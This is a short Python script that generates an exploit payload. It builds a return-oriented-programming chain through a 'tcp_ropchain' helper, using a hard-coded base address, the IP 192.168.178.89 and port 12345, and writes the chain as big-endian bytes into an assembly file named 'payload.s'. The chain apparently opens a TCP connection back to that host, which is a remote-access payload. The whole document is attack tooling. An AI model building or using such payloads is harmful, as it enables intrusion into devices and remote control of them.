from tcp_ropchain import *
import struct

rop_chain = tcp_thread_ropchain(0x4D070000 + 0x14, [192,168,178,89], 12345)

with open('payload.s', 'w') as f:
    for val in rop_chain:
        bytes = [hex(val >> i & 0xff) for i in (24,16,8,0)]
        for v in bytes:
            print('byte %s' % v, file=f)